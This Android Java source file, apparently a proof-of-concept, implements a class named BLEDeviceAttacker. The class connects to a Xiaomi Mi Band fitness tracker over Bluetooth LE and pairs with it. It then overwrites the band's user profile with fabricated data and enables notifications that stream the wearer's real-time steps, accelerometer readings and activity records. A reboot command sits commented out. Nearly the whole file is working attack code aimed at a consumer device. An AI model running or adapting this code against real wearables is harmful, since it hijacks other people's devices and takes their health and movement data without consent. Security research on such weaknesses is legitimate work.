package cheng.kover.attacker;

import android.app.Activity;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothProfile;
import android.os.Handler;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.TextView;

import java.io.UnsupportedEncodingException;
import java.util.Arrays;
import java.util.UUID;

public class BLEDeviceAttacker
{
	private static final String                TAG = "DeviceAttacker";
	private              Activity              activity;
	private              BluetoothDevice       targetDevice;
	private              BluetoothGatt         bluetoothGatt;
	private              BluetoothGattCallback bluetoothGattCallback;

	public BLEDeviceAttacker(final Activity activity)
	{
		this.activity = activity;

		// Process Bluetooth Callbacks.
		bluetoothGattCallback = new BluetoothGattCallback()
		{
			@Override
			public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState)
			{
				super.onConnectionStateChange(gatt, status, newState);

				if (newState == BluetoothProfile.STATE_CONNECTED)
				{
					Log.i(TAG + "Callback", "Connection established. Start discovering services.");
					gatt.discoverServices();
				}
				else
				{
					if (newState == BluetoothProfile.STATE_DISCONNECTED)
					{
						Log.w(TAG + "Callback", "Disconnected!!!");
						gatt.close();
					}
				}
			}

			@Override
			public void onServicesDiscovered(BluetoothGatt gatt, int status)
			{
				super.onServicesDiscovered(gatt, status);
				if (status == BluetoothGatt.GATT_SUCCESS)
				{
					Log.i(TAG + "Callback", "Services discovered.");
				}
				else
				{
					Log.e(TAG + "Callback", "onServicesDiscovered received: " + status);
				}
			}

			@Override
			public void onCharacteristicRead(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status)
			{
				super.onCharacteristicRead(gatt, characteristic, status);
				if (status == BluetoothGatt.GATT_SUCCESS)
				{
					// Device info
					if (MiBandProfile.UUID_CHAR_DEVICE_INFO.equals(characteristic.getUuid()))
					{
						byte[] value           = characteristic.getValue();
						int    firmwareVersion = 0;
						for (int i = 0; i < 4; ++ i)
						{
							firmwareVersion |= (value[12 + i] & 255) << i * 8;
						}
						Log.i(TAG + "Callback", "Device Info: Firmware Version - " + firmwareVersion);
					}

					// Device name
					if (MiBandProfile.UUID_CHAR_DEVICE_NAME.equals(characteristic.getUuid()))
					{
						try
						{
							String deviceName = new String(characteristic.getValue(), "UTF-8");
							Log.i(TAG + "Callback", "Device Name" + deviceName);
							((TextView) activity.findViewById(R.id.device_name)).setText(deviceName.replaceAll("[^a-z^A-Z^0-9]", ""));
						}
						catch (UnsupportedEncodingException e)
						{
							e.printStackTrace();
						}
					}

					// Activity data
					if (MiBandProfile.UUID_CHAR_ACTIVITY_DATA.equals(characteristic.getUuid()) || MiBandProfile.UUID_CHAR_STATISTICS
							.equals(characteristic.getUuid()))
					{
						Log.i(TAG + "Callback", "Activity: " + Arrays.toString(characteristic.getValue()));
						((TextView) activity.findViewById(R.id.activityData)).setText(Arrays.toString(characteristic.getValue()));
					}
				}
				else
				{
					Log.e(TAG + "Callback", characteristic.getUuid() + "onServicesDiscovered received: " + status);
				}
			}

			@Override
			public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic)
			{
				super.onCharacteristicChanged(gatt, characteristic);

				Log.d("test", "onCharacteristicChanged received: " + Arrays.toString(characteristic.getValue()));

				// Receive characteristic notification data
				if (MiBandProfile.UUID_CHAR_NOTIFICATION.equals(characteristic.getUuid()))
				{
					byte[] notificationValue = characteristic.getValue();

					if (notificationValue.length != 1)
					{
						Log.e(TAG + "Callback", "Notification Char return wrong with " + notificationValue.length + " byte(s).");
					}
					else
					{
						switch (notificationValue[0])
						{
							case 0x6:
								Log.e(TAG + "Callback", "Need to authenticate by tapping.");
								break;
							case 0x5:
							case 0xa:
							case 0x15:
								Log.i(TAG + "Callback", "Successfully authenticated.");
								break;
							default:
								Log.e(TAG + "Callback", "Unsolved message: " + notificationValue[0]);
						}
					}
				}

				// Receive real time steps data
				if (MiBandProfile.UUID_CHAR_REALTIME_STEPS.equals(characteristic.getUuid()))
				{
					byte[] stepsData = characteristic.getValue();
					if (stepsData.length == 4)
					{
						int steps = stepsData[3] << 24 | (stepsData[2] & 0xFF) << 16 | (stepsData[1] & 0xFF) << 8 | (stepsData[0] & 0xFF);
						Log.i(TAG + "Callback", "Real time steps: " + steps);
						((TextView) activity.findViewById(R.id.realTimeSteps_attacker)).setText(String.valueOf(steps));
						((TextView) activity.findViewById(R.id.realTimeSteps_observer)).setText(String.valueOf(steps));
					}
				}

				// Receive sensor data
				if (MiBandProfile.UUID_CHAR_SENSOR_DATA.equals(characteristic.getUuid()))
				{
					Log.i(TAG + "Callback", "Sensor data notification: " + Arrays.toString(characteristic.getValue()));
					handleSensorData(characteristic.getValue());
				}
			}
		};
	}

	public void observation(final BluetoothDevice bluetoothDevice)
	{
		targetDevice = bluetoothDevice;

		// Connect device
		bluetoothGatt = targetDevice.connectGatt(activity, false, bluetoothGattCallback);

		if (null == bluetoothGatt)
		{
			Log.e(TAG, "Didn't get BluetoothGatt.");
		}
		else
		{
			if (! bluetoothGatt.connect())
			{
				Log.e(TAG, "Connect failed.");
			}
			else
			{
				Handler handler = new Handler();
				handler.postDelayed(new Runnable()
				{
					private void delay()
					{
						try
						{
							Thread.sleep(1000);
						}
						catch (InterruptedException e)
						{
							e.printStackTrace();
						}
					}

					@Override
					public void run()
					{
						delay();
						// Set low latency
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_LE_PARAMS, getLatency(39, 49, 0, 500, 0));
						delay();
						// Read device info
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_DEVICE_INFO);
						delay();
						// Pair with MiBand
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_PAIR, new byte[] {2});
						delay();
						// Read device name
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_DEVICE_NAME);

						// Show available services and characteristics
						StringBuilder gattString = new StringBuilder();
						for (BluetoothGattService bluetoothGattService : bluetoothGatt.getServices())
						{
							Log.d(TAG + "GIWA", " - Service: " + bluetoothGattService.getUuid());
							gattString.append("Service: " + bluetoothGattService.getUuid() + "\r\n");
							for (BluetoothGattCharacteristic bluetoothGattCharacteristic : bluetoothGattService.getCharacteristics())
							{
								Log.d(TAG + "GIWA", " -- Characteristic: " + bluetoothGattCharacteristic.getUuid());
								gattString.append("---Characteristic: " + bluetoothGattCharacteristic.getUuid() + "\r\n");
							}
						}
						((TextView) activity.findViewById(R.id.gatt_service)).setMovementMethod(ScrollingMovementMethod.getInstance());
						((TextView) activity.findViewById(R.id.gatt_service)).setText(gattString);

						delay();
						// Enable realtime steps notify
						setNotify(MiBandProfile.UUID_CHAR_REALTIME_STEPS);
					}
				}, 5000);
			}
		}
	}

	public void attack(final BluetoothDevice bluetoothDevice)
	{
		targetDevice = bluetoothDevice;

		// Connect device
		bluetoothGatt = targetDevice.connectGatt(activity, false, bluetoothGattCallback);

		if (null == bluetoothGatt)
		{
			Log.e(TAG, "Didn't get BluetoothGatt.");
		}
		else
		{
			if (! bluetoothGatt.connect())
			{
				Log.e(TAG, "Connect failed.");
			}
			else
			{
				Handler handler = new Handler();
				handler.postDelayed(new Runnable()
				{
					private void delay()
					{
						try
						{
							Thread.sleep(1000);
						}
						catch (InterruptedException e)
						{
							e.printStackTrace();
						}
					}

					@Override
					public void run()
					{
						delay();
						// Enable notification
						setNotify(MiBandProfile.UUID_CHAR_NOTIFICATION);
						delay();
						// Set low latency
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_LE_PARAMS, getLatency(39, 49, 0, 500, 0));
						delay();
						// Pair with MiBand
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_PAIR, new byte[] {2});
						delay();
						// Write user info
						MiBandUserInfo miBandUserInfo      = new MiBandUserInfo(0, 20, 175, 50, "mi_user_alias", 0);
						byte[]         miBandUserInfoBytes = miBandUserInfo.toBytes(bluetoothDevice.getAddress());
						Log.d(TAG, "Set User Info: " + miBandUserInfo.toString() + ", bytes: " + bytesToHex(miBandUserInfoBytes));
						// Generated fake / random user info
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_USER_INFO, miBandUserInfoBytes);
						// Hardcoded / scapegoat user info
//						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_USER_INFO, new byte[]{15,5,13,2,2,9,8,7,6,5,0,10,1,13,8,2,0,5,10,11,8,2,11,14,11,9,3,8,5,9,12,15});
						delay();
						delay();
						delay();
						delay();
						delay();
						delay();
						// Enable real time steps notify
						setNotify(MiBandProfile.UUID_CHAR_REALTIME_STEPS);
						delay();
						// Enable sensor notify
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_CONTROL_POINT, new byte[] {18, 1});
						delay();
						setNotify(MiBandProfile.UUID_CHAR_SENSOR_DATA);
						delay();
						// ?
						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_CONTROL_POINT, new byte[] {6});
						delay();
						readCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_ACTIVITY_DATA);
						delay();
						// reboot
//						writeCharacteristic(MiBandProfile.UUID_SERVICE_MILI, MiBandProfile.UUID_CHAR_CONTROL_POINT, new byte[]{12});
					}
				}, 5000);
			}
		}
	}

	public static String bytesToHex(byte[] bytes)
	{
		final char[] HEX_CHAR = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
		char[]       buf      = new char[bytes.length * 2];
		int          index    = 0;
		for (byte b : bytes)
		{
			buf[index++] = HEX_CHAR[b >>> 4 & 0xf];
			buf[index++] = HEX_CHAR[b & 0xf];
		}
		return new String(buf);
	}

	public void writeCharacteristic(UUID serviceUUID, UUID characteristicUUID, byte[] value)
	{
		BluetoothGattCharacteristic bluetoothGattCharacteristic = bluetoothGatt.getService(serviceUUID).getCharacteristic(characteristicUUID);
		if (null == bluetoothGattCharacteristic)
		{
			Log.e(TAG + "IO", "Characteristic " + characteristicUUID + " not exist.");
			return;
		}
		bluetoothGattCharacteristic.setValue(value);
		if (! bluetoothGatt.writeCharacteristic(bluetoothGattCharacteristic))
		{
			Log.e(TAG + "IO", "Bluetooth GATT write characteristic " + characteristicUUID + " failed.");
			return;
		}
		Log.i(TAG + "IO", "Characteristic" + characteristicUUID + " successfully written value: " + Arrays.toString(value));
	}

	public void setNotify(UUID characteristicUUID)
	{
		Log.d(TAG + "IO", "Set char " + characteristicUUID + " Notify.");
		BluetoothGattCharacteristic bluetoothGattCharacteristic = bluetoothGatt.getService(MiBandProfile.UUID_SERVICE_MILI)
		                                                                       .getCharacteristic(characteristicUUID);
		if (null == bluetoothGattCharacteristic)
		{
			Log.e(TAG + "IO", "Characteristic " + characteristicUUID + " not exist.");
			return;
		}
		bluetoothGatt.setCharacteristicNotification(bluetoothGattCharacteristic, true);
		BluetoothGattDescriptor bluetoothGattDescriptor = bluetoothGattCharacteristic
				.getDescriptor(MiBandProfile.UUID_DESCRIPTOR_UPDATE_NOTIFICATION);
		bluetoothGattDescriptor.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
		bluetoothGatt.writeDescriptor(bluetoothGattDescriptor);
	}

	public void readCharacteristic(UUID serviceUUID, UUID characteristicUUID)
	{
		BluetoothGattCharacteristic bluetoothGattCharacteristic = bluetoothGatt.getService(serviceUUID).getCharacteristic(characteristicUUID);
		if (! bluetoothGatt.readCharacteristic(bluetoothGattCharacteristic))
		{
			Log.e(TAG + "IO", "Bluetooth GATT read characteristic " + characteristicUUID + " failed.");
			return;
		}
	}

	private void handleSensorData(byte[] value)
	{
		int    counter, step;
		double xAxis, yAxis, zAxis;
		double scale_factor = 1000.0;
		double gravity      = 9.81;

		if ((value.length - 2) % 6 != 0)
		{
			Log.e(TAG, "UNEXPECTED SENSOR DATA WITH LENGTH: " + value.length);
		}
		else
		{
			counter = (value[0] & 0xff) | ((value[1] & 0xff) << 8);
			for (int idx = 0; idx < ((value.length - 2) / 6); idx++)
			{
				step = idx * 6;

				// Analyse X-axis data
				int xAxisRawValue = (value[step + 2] & 0xff) | ((value[step + 3] & 0xff) << 8);
				int xAxisSign     = (value[step + 3] & 0x30) >> 4;
				int xAxisType     = (value[step + 3] & 0xc0) >> 6;
				if (xAxisSign == 0)
				{
					xAxis = xAxisRawValue & 0xfff;
				}
				else
				{
					xAxis = (xAxisRawValue & 0xfff) - 4097;
				}
				xAxis = (xAxis * 1.0 / scale_factor) * gravity;

				// Analyse Y-axis data
				int yAxisRawValue = (value[step + 4] & 0xff) | ((value[step + 5] & 0xff) << 8);
				int yAxisSign     = (value[step + 5] & 0x30) >> 4;
				int yAxisType     = (value[step + 5] & 0xc0) >> 6;
				if (yAxisSign == 0)
				{
					yAxis = yAxisRawValue & 0xfff;
				}
				else
				{
					yAxis = (yAxisRawValue & 0xfff) - 4097;
				}
				yAxis = (yAxis / scale_factor) * gravity;

				// Analyse Z-axis data
				int zAxisRawValue = (value[step + 6] & 0xff) | ((value[step + 7] & 0xff) << 8);
				int zAxisSign     = (value[step + 7] & 0x30) >> 4;
				int zAxisType     = (value[step + 7] & 0xc0) >> 6;
				if (zAxisSign == 0)
				{
					zAxis = zAxisRawValue & 0xfff;
				}
				else
				{
					zAxis = (zAxisRawValue & 0xfff) - 4097;
				}
				zAxis = (zAxis / scale_factor) * gravity;

				// Print results in log
				Log.i(TAG, "READ SENSOR DATA VALUES: counter:" + counter + " step:" + step + " x-axis:" + String
						.format("%.03f", xAxis) + " y-axis:" + String.format("%.03f", yAxis) + " z-axis:" + String.format("%.03f", zAxis));
				((TextView) activity.findViewById(R.id.motionSensorData)).setText(
						"x-axis:" + String.format("%.03f", xAxis) + "\r\ny-axis:" + String.format("%.03f", yAxis) + "\r\nz-axis:" + String
								.format("%.03f", zAxis));
			}
		}
	}

	private byte[] getLatency(int minConnectionInterval, int maxConnectionInterval, int latency, int timeout, int advertisementInterval)
	{
		byte result[] = new byte[12];
		result[0] = (byte) (minConnectionInterval & 0xff);
		result[1] = (byte) (0xff & minConnectionInterval >> 8);
		result[2] = (byte) (maxConnectionInterval & 0xff);
		result[3] = (byte) (0xff & maxConnectionInterval >> 8);
		result[4] = (byte) (latency & 0xff);
		result[5] = (byte) (0xff & latency >> 8);
		result[6] = (byte) (timeout & 0xff);
		result[7] = (byte) (0xff & timeout >> 8);
		result[8] = 0;
		result[9] = 0;
		result[10] = (byte) (advertisementInterval & 0xff);
		result[11] = (byte) (0xff & advertisementInterval >> 8);

		return result;
	}
}